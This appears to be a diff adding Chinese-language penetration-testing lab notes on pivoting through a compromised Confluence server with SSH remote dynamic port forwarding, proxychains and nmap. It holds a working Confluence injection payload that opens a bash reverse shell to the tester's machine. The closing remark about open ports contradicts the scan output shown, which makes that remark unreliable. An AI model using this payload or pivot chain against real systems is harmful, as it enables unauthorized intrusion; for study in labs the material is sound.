@@ -2057,3 +2057,155 @@ hr_backup=# SELECT * FROM payroll;
 > ```
 
 ### SSH Remote Dynamic Port Forwarding
+上述 Remote Port Forwarding 允許將單一 port 流量轉發回遠端伺服器，這類似於傳統的 Reverse Shell。🥚 這有個限制：每次 SSH 連線只能轉發一個特定的目標 port\
+Remote Dynamic Port Forwarding 則突破了這個限制。它的概念是：
+- 在 SSH 伺服器上綁定一個 SOCKS proxy port
+- SSH 客戶端負責將 SOCKS 代理的流量透過 SSH tunnel 轉發
+- 這使得 client 端可以存取伺服器可連接的所有內部目標，而不只是單一端口
+
+![image](https://hackmd.io/_uploads/ByffYxVi1l.png)
+連接到 CONFLUENCE01 可以存取的任何主機上的任何 port。這等同於在 Kali 機器上開了一個 SOCKS 代理，然後可以透過這個 proxy 來連線到攻陷的內部網路，存取其他系統。
+>[!Tip]
+>Remote dynamic port forwarding has only been available since October 2017's [OpenSSH 7.6](https://www.openssh.com/txt/release-7.6). Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn't matter.
+
+[擴增場景]\
+在 DMZ 中找到另一台 Windows server (MULTISERVER03)，防火牆阻止從 Kali 連線到 MULTISERVER03 上的任何 port，或 CONFLUENCE01 上除了 TCP/8090 之外的任何 port，如下圖：
+![image](https://hackmd.io/_uploads/BJcQng4i1l.png)
+從 CONFLUENCE01 透過 SSH 連接到我們的 Kali ，然後建立一個 Remote Dynamic Port Forwarding，這樣就可以從 Kali 開始列舉 MULTISERVER03
+- SSH session 從 CONFLUENCE01 發起
+- 連線到 Kali SSH server
+- 將 SOCKS proxy port 綁定在 Kali TCP/9998 上
+- 透過 SSH tunnel 送到 CONFLUENCE01
+- 再根據 addressed 轉送到 MULTISERVER03
+
+#### 1. start the Kali SSH server
+```
+┌──(chw㉿CHW)-[~]
+└─$ ip a
+...
+9: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet 192.168.45.182/24 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::ac14:a08e:7658:5796/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+                                                                                                
+┌──(chw㉿CHW)-[~]
+└─$ sudo systemctl start ssh
+[sudo] password for chw:
+```
+>`sudo ss -ntplu` 驗證服務
+
+#### 2. 建立交互式的 TTY shell
+在 target machine 注入 reverse shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/8888%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.195.63] 54156
+bash: cannot set terminal process group (2618): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$
+```
+
+#### 3. 設定 SSH Remote Dynamic Port Forwarding
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'   
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
+$ ssh -N -R 9998 chw@192.168.45.182
+ssh -N -R 9998 chw@192.168.45.182
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '192.168.45.182 (192.168.45.182)' can't be established.
+ECDSA key fingerprint is SHA256:Atuf88ckgvdjD92PblnxCBvzAiN1jtxNUv6woYcEmxg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+chw@192.168.45.182's password: ***********
+
+
+```
+確認啟用狀況：
+```
+┌──(chw㉿CHW)-[~]
+└─$ ss -ntplu
+Netid       State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port       Process       
+...
+tcp         LISTEN        0             128                      127.0.0.1:9998                     0.0.0.0:*                        
+tcp         LISTEN        0             128                        0.0.0.0:22                       0.0.0.0:*                        
+tcp         LISTEN        0             128                      127.0.0.1:2345                     0.0.0.0:*                        
+tcp         LISTEN        0             128                          [::1]:9998                        [::]:*                        
+tcp         LISTEN        0             128                           [::]:22                          [::]:*
+```
+> 成功綁定 TCP 9998 port
+> > `:2345` 上一章節的 Tunnel，可以 Kill process
+> > ![image](https://hackmd.io/_uploads/HJa3g-NsJx.png)
+
+#### 4. 使用 Proxychains 設定 SOCKS proxy
+設定 SOCKS proxy
+```
+┌──(chw㉿CHW)-[~]
+└─$ tail /etc/proxychains4.conf   
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+#socks4         127.0.0.1 9050
+#socks5 192.168.147.63 9999
+socks5 127.0.0.1 9998
+```
+
+#### 5. 透過 Proxychains 進行 Nmap 掃描
+```
+┌──(chw㉿CHW)-[~]
+└─$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.195.215
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 23:31 EST
+Initiating Connect Scan at 23:31
+Scanning 10.4.195.215 [20 ports]
+[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.195.215:445 <--socket error or timeout!
+[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.195.215:3306 <--socket error or timeout!
+...
+Scanned at 2025-03-03 23:31:26 EST for 7s
+
+PORT     STATE  SERVICE       REASON
+21/tcp   closed ftp           conn-refused
+22/tcp   open   ssh           syn-ack
+23/tcp   closed telnet        conn-refused
+25/tcp   closed smtp          conn-refused
+53/tcp   closed domain        conn-refused
+80/tcp   closed http          conn-refused
+110/tcp  closed pop3          conn-refused
+111/tcp  closed rpcbind       conn-refused
+135/tcp  closed msrpc         conn-refused
+139/tcp  closed netbios-ssn   conn-refused
+143/tcp  closed imap          conn-refused
+443/tcp  closed https         conn-refused
+445/tcp  closed microsoft-ds  conn-refused
+993/tcp  closed imaps         conn-refused
+995/tcp  closed pop3s         conn-refused
+1723/tcp closed pptp          conn-refused
+3306/tcp closed mysql         conn-refused
+3389/tcp closed ms-wbt-server conn-refused
+5900/tcp closed vnc           conn-refused
+8080/tcp closed http-proxy    conn-refused
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
+```
+> 可以發現 ports 80, 135, and 3389 都開著
+
+### Using sshuttle
